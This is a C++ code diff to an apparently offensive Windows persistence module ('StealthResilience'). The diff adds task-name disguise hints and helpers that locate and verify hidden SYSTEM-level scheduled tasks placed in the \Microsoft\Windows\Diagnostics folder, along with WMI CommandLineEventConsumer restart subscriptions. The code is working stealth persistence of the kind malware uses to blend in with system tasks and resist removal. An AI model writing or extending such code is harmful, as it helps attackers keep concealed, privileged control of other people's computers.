@@ -12,6 +12,8 @@ using Microsoft::WRL::ComPtr;
 
 namespace {
 
+static bool IsNullOrEmpty(const wchar_t* value);
+
 struct ScopedVariant {
     VARIANT value;
     ScopedVariant() {
@@ -131,12 +133,13 @@ std::wstring GuidToString(const GUID& guid) {
     return formatted;
 }
 
-std::wstring BuildTaskName(const wchar_t* serviceName, const wchar_t* suffix) {
+std::wstring BuildTaskName(const wchar_t* serviceName, const wchar_t* hint, const wchar_t* suffix) {
     GUID guid = {};
     if (FAILED(CoCreateGuid(&guid))) {
         return L"";
     }
-    std::wstring clean = SanitizeName(serviceName);
+    const wchar_t* baseSource = (hint != nullptr && hint[0] != L'\0') ? hint : serviceName;
+    std::wstring clean = SanitizeName(baseSource);
     if (clean.empty()) {
         clean = L"Service";
     }
@@ -298,6 +301,30 @@ HRESULT RegisterTaskDefinition(
     return S_OK;
 }
 
+static bool SplitTaskFullPath(const wchar_t* fullPath, std::wstring& folderPath, std::wstring& taskName)
+{
+    if (IsNullOrEmpty(fullPath)) {
+        return false;
+    }
+
+    std::wstring normalized = fullPath;
+    if (normalized.front() != L'\\') {
+        normalized.insert(normalized.begin(), L'\\');
+    }
+
+    size_t pos = normalized.find_last_of(L'\\');
+    if (pos == std::wstring::npos || pos == normalized.length() - 1) {
+        return false;
+    }
+
+    folderPath = normalized.substr(0, pos);
+    if (folderPath.empty()) {
+        folderPath = L"\\";
+    }
+    taskName = normalized.substr(pos + 1);
+    return !taskName.empty();
+}
+
 std::wstring BuildEventXPath(const wchar_t* serviceName) {
     if (serviceName == nullptr) {
         return L"";
@@ -313,7 +340,7 @@ std::wstring BuildEventXPath(const wchar_t* serviceName) {
     return std::wstring(buffer);
 }
 
-bool IsNullOrEmpty(const wchar_t* value) {
+static bool IsNullOrEmpty(const wchar_t* value) {
     return (value == nullptr || value[0] == L'\0');
 }
 
@@ -433,6 +460,7 @@ HRESULT DeleteWmiInstance(IWbemServices* services, const std::wstring& path) {
 
 BOOL StealthResilience_CreateAutorunTask(
     const wchar_t* serviceName,
+    const wchar_t* taskHint,
     const wchar_t* triggerKeyword,
     BOOL hidden,
     wchar_t* createdTaskPath,
@@ -485,7 +513,9 @@ BOOL StealthResilience_CreateAutorunTask(
         ComPtr<ILogonTrigger> logon;
         if (SUCCEEDED(trigger.As(&logon)) && logon) {
             ScopedBstr systemUser(L"SYSTEM");
-            logon->put_UserId(systemUser.Get());
+            if (systemUser.Get() == nullptr || FAILED(logon->put_UserId(systemUser.Get()))) {
+                return FALSE;
+            }
         }
     }
 
@@ -524,7 +554,7 @@ BOOL StealthResilience_CreateAutorunTask(
         return FALSE;
     }
 
-    std::wstring taskName = BuildTaskName(serviceName, L"Autorun");
+    std::wstring taskName = BuildTaskName(serviceName, taskHint, L"Autorun");
     if (taskName.empty()) {
         return FALSE;
     }
@@ -540,6 +570,7 @@ BOOL StealthResilience_CreateAutorunTask(
 
 BOOL StealthResilience_CreateRestartTask(
     const wchar_t* serviceName,
+    const wchar_t* taskHint,
     const wchar_t* eventXPath,
     BOOL hidden,
     wchar_t* createdTaskPath,
@@ -630,7 +661,7 @@ BOOL StealthResilience_CreateRestartTask(
         return FALSE;
     }
 
-    std::wstring taskName = BuildTaskName(serviceName, L"RestartOnStop");
+    std::wstring taskName = BuildTaskName(serviceName, taskHint, L"RestartOnStop");
     if (taskName.empty()) {
         return FALSE;
     }
@@ -765,6 +796,136 @@ BOOL StealthResilience_DeleteTasksByPrefix(
     return TRUE;
 }
 
+BOOL StealthResilience_TaskExists(const wchar_t* taskPath)
+{
+    if (IsNullOrEmpty(taskPath)) {
+        return FALSE;
+    }
+
+    std::wstring folderPath;
+    std::wstring taskName;
+    if (!SplitTaskFullPath(taskPath, folderPath, taskName)) {
+        return FALSE;
+    }
+
+    ComInitGuard guard;
+    if (FAILED(guard.status()) || FAILED(EnsureComSecurity())) {
+        return FALSE;
+    }
+
+    ComPtr<ITaskService> service;
+    if (FAILED(ConnectTaskService(service))) {
+        return FALSE;
+    }
+
+    ScopedBstr folderBstr(folderPath.c_str());
+    if (folderBstr.Get() == nullptr) {
+        return FALSE;
+    }
+
+    ComPtr<ITaskFolder> folder;
+    if (FAILED(service->GetFolder(folderBstr.Get(), &folder))) {
+        return FALSE;
+    }
+
+    ScopedBstr taskBstr(taskName.c_str());
+    if (taskBstr.Get() == nullptr) {
+        return FALSE;
+    }
+
+    ComPtr<IRegisteredTask> task;
+    HRESULT hr = folder->GetTask(taskBstr.Get(), &task);
+    return SUCCEEDED(hr) && task != nullptr;
+}
+
+BOOL StealthResilience_FindTaskByPrefix(
+    const wchar_t* taskPrefix,
+    const wchar_t* token,
+    wchar_t* outTaskPath,
+    size_t outTaskPathCch)
+{
+    if (outTaskPath == nullptr || outTaskPathCch == 0) {
+        return FALSE;
+    }
+    outTaskPath[0] = L'\0';
+
+    if (IsNullOrEmpty(taskPrefix)) {
+        return FALSE;
+    }
+
+    std::wstring prefixLower = taskPrefix;
+    for (auto& ch : prefixLower) {
+        ch = towlower(ch);
+    }
+
+    std::wstring tokenLower;
+    if (!IsNullOrEmpty(token)) {
+        tokenLower = token;
+        for (auto& ch : tokenLower) {
+            ch = towlower(ch);
+        }
+    }
+
+    ComInitGuard guard;
+    if (FAILED(guard.status()) || FAILED(EnsureComSecurity())) {
+        return FALSE;
+    }
+
+    ComPtr<ITaskService> service;
+    if (FAILED(ConnectTaskService(service))) {
+        return FALSE;
+    }
+
+    ComPtr<ITaskFolder> diagnosticsFolder;
+    if (FAILED(ResolveDiagnosticsFolder(service.Get(), diagnosticsFolder))) {
+        return FALSE;
+    }
+
+    ComPtr<IRegisteredTaskCollection> tasks;
+    if (FAILED(diagnosticsFolder->GetTasks(TASK_ENUM_HIDDEN, &tasks))) {
+        return FALSE;
+    }
+
+    LONG count = 0;
+    tasks->get_Count(&count);
+
+    for (LONG i = 0; i < count; ++i) {
+        ComPtr<IRegisteredTask> task;
+        VARIANT idx;
+        VariantInit(&idx);
+        idx.vt = VT_I4;
+        idx.lVal = i + 1;
+        if (FAILED(tasks->get_Item(idx, &task)) || !task) {
+            continue;
+        }
+
+        ScopedBstr nameBstr;
+        if (FAILED(task->get_Name(&nameBstr.value)) || nameBstr.Get() == nullptr) {
+            continue;
+        }
+
+        std::wstring nameLower = nameBstr.Get();
+        for (auto& ch : nameLower) {
+            ch = towlower(ch);
+        }
+
+        if (nameLower.find(prefixLower) == std::wstring::npos) {
+            continue;
+        }
+        if (!tokenLower.empty() &&
+            nameLower.find(tokenLower) == std::wstring::npos) {
+            continue;
+        }
+
+        std::wstring fullPath = L"\\Microsoft\\Windows\\Diagnostics\\";
+        fullPath.append(nameBstr.Get());
+        wcsncpy_s(outTaskPath, outTaskPathCch, fullPath.c_str(), _TRUNCATE);
+        return TRUE;
+    }
+
+    return FALSE;
+}
+
 BOOL StealthResilience_CreateWmiRestartSubscription(
     const wchar_t* serviceName,
     const wchar_t* methodClass,
@@ -860,7 +1021,10 @@ BOOL StealthResilience_CreateWmiRestartSubscription(
         DeleteWmiInstance(services.Get(), L"__EventFilter.Name=\"" + EscapeWmiName(filterName) + L"\"");
         return FALSE;
     }
-    consumer->Put(L"RunInteractively", 0, nullptr, 0);
+    ScopedVariant runInteractive;
+    runInteractive->vt = VT_BOOL;
+    runInteractive->boolVal = VARIANT_FALSE;
+    consumer->Put(L"RunInteractively", 0, &runInteractive.get(), 0);
 
     if (FAILED(services->PutInstance(consumer.Get(), WBEM_FLAG_CREATE_OR_UPDATE, nullptr, nullptr))) {
         DeleteWmiInstance(services.Get(), L"__EventFilter.Name=\"" + EscapeWmiName(filterName) + L"\"");
@@ -998,6 +1162,128 @@ BOOL StealthResilience_RemoveWmiSubscriptionsByPrefix(
     }
     if (removedConsumers) {
         *removedConsumers = consumerRemoved;
+    }
+    return TRUE;
+}
+
+BOOL StealthResilience_FindWmiSubscriptionsByPrefix(
+    const wchar_t* filterPrefix,
+    const wchar_t* consumerPrefix,
+    wchar_t* outFilterName,
+    size_t filterNameCch,
+    wchar_t* outConsumerName,
+    size_t consumerNameCch)
+{
+    if (outFilterName != nullptr && filterNameCch > 0) {
+        outFilterName[0] = L'\0';
+    }
+    if (outConsumerName != nullptr && consumerNameCch > 0) {
+        outConsumerName[0] = L'\0';
+    }
+
+    if (IsNullOrEmpty(filterPrefix) && IsNullOrEmpty(consumerPrefix)) {
+        return FALSE;
+    }
+
+    ComInitGuard guard;
+    if (FAILED(guard.status()) || FAILED(EnsureComSecurity())) {
+        return FALSE;
+    }
+
+    ComPtr<IWbemServices> services;
+    if (FAILED(ConnectWmi(NormalizeNamespace(L"root\\subscription"), services))) {
+        return FALSE;
+    }
+
+    auto QueryFirst = [&](const wchar_t* className,
+                          const wchar_t* prefix,
+                          wchar_t* destination,
+                          size_t destinationCch) -> bool
+    {
+        if (IsNullOrEmpty(prefix) || destination == nullptr || destinationCch == 0) {
+            return false;
+        }
+
+        std::wstring query = L"SELECT Name FROM ";
+        query.append(className);
+        query.append(L" WHERE Name LIKE '");
+        query.append(prefix);
+        query.append(L"%'" );
+
+        ScopedBstr queryBstr(query.c_str());
+        ScopedBstr lang(L"WQL");
+        ComPtr<IEnumWbemClassObject> enumerator;
+        if (FAILED(services->ExecQuery(lang.Get(), queryBstr.Get(),
+                WBEM_FLAG_FORWARD_ONLY, nullptr, &enumerator)) || !enumerator) {
+            return false;
+        }
+
+        ULONG fetched = 0;
+        ComPtr<IWbemClassObject> obj;
+        if (enumerator->Next(WBEM_INFINITE, 1, &obj, &fetched) == S_OK && fetched == 1) {
+            ScopedVariant nameVar;
+            if (SUCCEEDED(obj->Get(L"Name", 0, &nameVar.get(), nullptr, nullptr)) &&
+                nameVar.get().vt == VT_BSTR) {
+                wcsncpy_s(destination, destinationCch, nameVar.get().bstrVal, _TRUNCATE);
+                return true;
+            }
+        }
+        return false;
+    };
+
+    BOOL found = FALSE;
+    if (!IsNullOrEmpty(filterPrefix) && outFilterName != nullptr && filterNameCch > 0) {
+        if (QueryFirst(L"__EventFilter", filterPrefix, outFilterName, filterNameCch)) {
+            found = TRUE;
+        }
+    }
+    if (!IsNullOrEmpty(consumerPrefix) && outConsumerName != nullptr && consumerNameCch > 0) {
+        if (QueryFirst(L"CommandLineEventConsumer", consumerPrefix, outConsumerName, consumerNameCch)) {
+            found = TRUE;
+        }
+    }
+
+    return found ? TRUE : FALSE;
+}
+
+BOOL StealthResilience_WmiSubscriptionExists(
+    const wchar_t* filterName,
+    const wchar_t* consumerName)
+{
+    if (IsNullOrEmpty(filterName) && IsNullOrEmpty(consumerName)) {
+        return FALSE;
+    }
+
+    ComInitGuard guard;
+    if (FAILED(guard.status()) || FAILED(EnsureComSecurity())) {
+        return FALSE;
+    }
+
+    ComPtr<IWbemServices> services;
+    if (FAILED(ConnectWmi(NormalizeNamespace(L"root\\subscription"), services))) {
+        return FALSE;
+    }
+
+    auto Exists = [&](const wchar_t* className, const wchar_t* name) -> bool
+    {
+        if (IsNullOrEmpty(name)) {
+            return true;
+        }
+        std::wstring path = std::wstring(className) + L".Name=\"" + EscapeWmiName(name) + L"\"";
+        ScopedBstr pathBstr(path.c_str());
+        if (pathBstr.Get() == nullptr) {
+            return false;
+        }
+        ComPtr<IWbemClassObject> object;
+        HRESULT hr = services->GetObject(pathBstr.Get(), 0, nullptr, &object, nullptr);
+        return SUCCEEDED(hr) && object != nullptr;
+    };
+
+    if (!Exists(L"__EventFilter", filterName)) {
+        return FALSE;
+    }
+    if (!Exists(L"CommandLineEventConsumer", consumerName)) {
+        return FALSE;
     }
     return TRUE;
 }
